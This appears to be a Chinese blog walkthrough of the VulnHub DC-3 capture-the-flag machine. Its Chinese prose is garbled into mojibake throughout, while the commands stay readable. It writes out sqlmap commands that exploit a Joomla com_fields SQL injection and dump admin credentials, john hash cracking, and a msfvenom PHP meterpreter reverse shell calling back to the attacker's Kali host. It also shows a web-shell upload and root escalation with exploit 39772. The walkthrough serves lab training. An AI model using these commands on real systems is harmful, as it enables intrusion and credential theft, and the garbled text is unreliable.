<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŠŠlocalhostæ”¹æˆé¶æœºipå³å¯</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p>
<p>è¿è¡Œ</p>
<p><img src="/2022/08/29/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></p>
<p>å‘ç°äº†é¶æœºä¸‹çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬æ‰€éœ€è¦çš„å°±æ˜¯<code>joomladb</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨åŸæœ‰çš„payloadååŠ ä¸Š-D joomladbï¼Œé€‰å®šæ•°æ®åº“</span></span><br><span class="line"><span class="comment">//å†åœ¨åé¢åŠ ä¸Š--tablesï¼Œè¾“å‡ºè¯¥æ•°æ®åº“çš„è¡¨</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°<code>#__users</code>çš„è¡¨ï¼Œé‡Œé¢å¾ˆå¯èƒ½æœ‰çº¿ç´¢</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> <span class="attr">--risk</span>=<span class="number">3</span> <span class="attr">--level</span>=<span class="number">5</span> <span class="attr">--random-agent</span> <span class="attr">--dbs</span> -<span class="selector-tag">p</span> list<span class="selector-attr">[fullordering]</span> -D joomladb -T <span class="string">&quot;#__users&quot;</span> <span class="attr">--columns</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œä½†æ³¨æ„è¡¨åæœ‰#ï¼Œæ‰€ä»¥éœ€è¦ç”¨å¼•å·æ¡†èµ·æ¥ï¼Œä¸ç„¶åé¢è¯­å¥å…¨è¢«æ³¨é‡Šäº†</span></span><br><span class="line"><span class="comment">//*æ³¨ï¼Œsqlmapæç¤ºæŒ‰é»˜è®¤æ¨èå°±å¥½</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></p>
<p>çœ‹åˆ°<code>username</code>å’Œ<code>password</code>ï¼ŒæŸ¥çœ‹åˆ—é‡Œå†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;<span class="link">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list</span>[<span class="string">fullordering</span>]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</span><br><span class="line"><span class="comment">//dumpè·å–å­—æ®µä¸­çš„æ•°æ®</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></p>
<p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p>
<p>ä½†æ˜¯å¯†ç è¢«åŠ å¯†äº†ï¼Œé‚£å°±åªèƒ½ç”¨ä¸€äº›å·¥å…·è¿›è¡Œè§£å¯†</p>
<p>å…ˆç”Ÿæˆä¸€ä¸ªåŠ å¯†å¯†ç çš„æ–‡æœ¬æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">è¾“å…¥vi passwd.txt</span><br><span class="line">ç„¶åæŠŠåŠ å¯†æ•°æ®å¤åˆ¶è¿›å»</span><br><span class="line">$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>ç„¶åæˆ‘ä»¬å°±éœ€è¦ç”¨ä¸€ä¸ªè§£å¯†å·¥å…·<code>john</code></p>
<p><code>John</code>æ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p>
<p>ä½¿ç”¨å¾ˆç®€å•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥john --show passwd.txt<span class="regexp">//</span>åé¢æ¥çš„æ˜¯å¯†ç æ–‡æœ¬æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>å¾—åˆ°å¯†ç <code>snoopy</code></p>
<p>ç„¶åç™»å½•åå°ç½‘å€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·åï¼š<span class="literal">admin</span></span><br><span class="line">å¯†ç ï¼šsnoopy</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></p>
<p>ç™»å½•æˆåŠŸï¼Œç„¶åæ‘¸ç´¢åˆ†æä¸€ä¸‹ç½‘ç«™</p>
<p>ç„¶ååœ¨<code>Extensions</code>â€“&gt;<code>Template</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></p>
<p><img src="/2022/08/29/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></p>
<p>å‘ç°æœ‰ä¸ª<code>new file</code>ï¼Œå¯ä»¥æ–°å»ºæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥æ–°å»ºä¸€ä¸ªæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ï¼Œæ‹¿å–é¶æœºçš„<code>shell</code></p>
<h2 id="åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell"><a href="#åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell" class="headerlink" title="åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell"></a>åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell</h2><h3 id="æ³•1"><a href="#æ³•1" class="headerlink" title="æ³•1"></a>æ³•1</h3><p><strong>msfvenom</strong></p>
<h4 id="msfç”Ÿæˆæœ¨é©¬"><a href="#msfç”Ÿæˆæœ¨é©¬" class="headerlink" title="msfç”Ÿæˆæœ¨é©¬"></a>msfç”Ÿæˆæœ¨é©¬</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥msfvenom -p php<span class="regexp">/meterpreter/</span>reverse_tcp LHOST=kaliçš„ip LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br><span class="line"><span class="regexp">//</span>æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">cat</span> <span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>å¾—åˆ°é¶æœºå¯¹åº”çš„æœ¨é©¬</p>
<p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶</p>
<p><img src="/2022/08/29/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p>
<p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p>
<p><img src="/2022/08/29/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p> ç„¶åä¿å­˜ä¸€ä¸‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p>
<p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p>
<p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨`/templates/protostar/ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p>
<p>çœ‹åˆ°/*ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p>
<h5 id="msfåˆ©ç”¨æœ¨é©¬"><a href="#msfåˆ©ç”¨æœ¨é©¬" class="headerlink" title="msfåˆ©ç”¨æœ¨é©¬"></a>msfåˆ©ç”¨æœ¨é©¬</h5><p>ç„¶åç”¨msfè¿›è¡Œåˆ©ç”¨</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">å…ˆè¾“å…¥msfconsoleï¼Œè¿›å…¥msf</span><br></pre></td></tr></table></figure>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">ç„¶åè¾“å…¥</span><br><span class="line">use exploit<span class="regexp">/multi/</span>handler</span><br><span class="line"></span><br><span class="line">set payload php<span class="regexp">/meterpreter/</span>reverse_tcp</span><br><span class="line">è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">show</span> <span class="keyword">options</span></span><br><span class="line">çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">set</span> LHOST <span class="comment">192.168.133.140</span>  //<span class="comment">kali</span>çš„<span class="comment">ip</span></span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">run</span>ï¼Œè¿è¡Œ</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></p>
<p>ç„¶åè¾“å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">shell</span></span><br><span class="line"></span><br><span class="line">ç„¶åè¾“å…¥<span class="keyword">python</span> -<span class="keyword">c</span> <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">//è¿›å…¥äº¤äº’å¼<span class="keyword">shell</span>ï¼Œå½“ç„¶ä¸å«Œçœ‹ç€éº»çƒ¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œåé¢å‘½ä»¤</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></p>
<h5 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span>,ç®€å•çœ‹çœ‹æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">uname</span> -a</span><br><span class="line">æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p>
<p>çœ‹åˆ°unbuntuæ˜¯2016å¹´4æœˆå‘å¸ƒçš„ï¼Œæ‰€ä»¥æ˜¯unbuntu16.04</p>
<p>linuxç‰ˆæœ¬æ˜¯4.4.0-21ç‰ˆ</p>
<p>æ‰€ä»¥æ ¹æ®è¿™ä¸ªç‰ˆæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œæ¥æ–¹ä¾¿æˆ‘ä»¬ææƒ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç”¨è¿‡çš„</span><br><span class="line">searchsploit unbuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p>
<p><strong>double-fdput()</strong> ,è¿™æ˜¯è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯è·å–rootæƒé™</p>
<p>æˆ‘ä»¬æŠŠå®ƒå†…å®¹æ˜¾ç¤ºå‡ºæ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥searchsploit -p <span class="number">39772</span>æ˜¾ç¤ºæ–‡æœ¬è·¯å¾„</span><br><span class="line">   cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">39772</span>.txt æ˜¾ç¤ºå†…å®¹</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p>
<p>åœ¨æœ€åçœ‹åˆ°è¯¥æ¼æ´åˆ©ç”¨çš„expä¸‹è½½é“¾æ¥</p>
<p><img src="/2022/08/29/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p>
<p>ä¸‹è½½æœ€åä¸€ä¸ªé“¾æ¥çš„å‹ç¼©åŒ…</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååœ¨æˆ‘ä»¬çš„ç½‘ç«™åå°ä¸Šä¼ ä¸Šå»ï¼Œå’Œåˆ›å»ºæœ¨é©¬æ–‡ä»¶æ—¶å€™ä¸€æ ·</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></p>
<p>ç»“æœæŠ¥é”™äº†</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p>
<p>çœ‹æ¥è¿™ä¸ªç½‘ç«™ä¸Šä¼ å¤„æ˜¯ä¸èƒ½ä¸Šä¼ å‹ç¼©åŒ…æ–‡ä»¶çš„</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨å·¥å…·è¿›è¡Œç›´æ¥ä¸Šä¼ äº†ï¼Œæ¯”å¦‚èšå‰‘æˆ–è€…èœåˆ€ç­‰å·¥å…·</p>
<p>æˆ‘ä»¬å’Œä¹‹å‰ä¸€æ ·æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶å†™ä¸Šæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p>
<p>ç”¨èšå‰‘è¿æ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p>
<p>ç„¶åæŠŠæˆ‘ä»¬çš„å‹ç¼©åŒ…æ”¾åœ¨ç›®å½•ä¸‹</p>
<p><img src="/2022/08/29/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p>
<p>ç„¶åè¿”å›msf</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p>
<p>å‘ç°å‹ç¼©åŒ…å·²ç»åœ¨é‡Œé¢äº†</p>
<p>ç„¶åè§£å‹ç¼©</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">è¾“å…¥unzip <span class="number">39772.</span><span class="built_in">zip</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></p>
<p>å‘ç°ç›®å½•ä¸‹å¤šäº†ä¸ª<code>39772</code>çš„ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> 39772</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>exploit.tar</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥tar -xvf exploit.tar <span class="regexp">//</span>è§£å‹ç¼©</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></p>
<p>å‘ç°å¤šäº†ä¸ª<code>ebpf_mapfd_doubleput_exploit</code>ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></p>
<p>å‘ç°æœ‰ä¸ª<code>compile.sh</code></p>
<p>è¿è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥./compile.sh</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°ç›®å½•ä¸‹æœ‰å¤šäº†ä¸€ä¸ª<code>doubleput</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></p>
<p>è¿™å°±æ˜¯ææƒæ–‡ä»¶ï¼Œè¿è¡Œä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥./doupleput</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼Œçœ‹çœ‹ææƒæˆåŠŸæ²¡</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p>
<p>ææƒæˆåŠŸ</p>
<p>ç„¶åæˆ‘ä»¬åˆ°/rootç›®å½•ä¸‹æŸ¥çœ‹ flag</p>
<p><img src="/2022/08/29/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p>
<hr>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line"> \ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">   \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">    \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you&#x27;ve enjoyed this challenge as I enjoyed making it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If there are any ways that I can improve these little challenges,</span></span><br><span class="line"><span class="string">please let me know.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">As per usual, comments and complaints can be sent via Twitter to @DCAU7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Have a great day!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ„æ€æ˜¯ï¼š</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ­å–œä½ ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚ï¼š-ï¼‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æˆ‘å¸Œæœ›ä½ å’Œæˆ‘ä¸€æ ·å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¦‚æœæœ‰ä»»ä½•æ–¹æ³•å¯ä»¥æ”¹å–„è¿™äº›å°æŒ‘æˆ˜ï¼Œ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è¯·è®©æˆ‘çŸ¥é“ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¦‚å¾€å¸¸ä¸€æ ·ï¼Œè¯„è®ºå’ŒæŠ•è¯‰å¯ä»¥é€šè¿‡Twitterå‘é€åˆ°@DCAU7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ç¥ä½ æœ‰ç¾å¥½çš„ä¸€å¤©ï¼ï¼ï¼ï¼ </span></span><br></pre></td></tr></table></figure></div>

<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
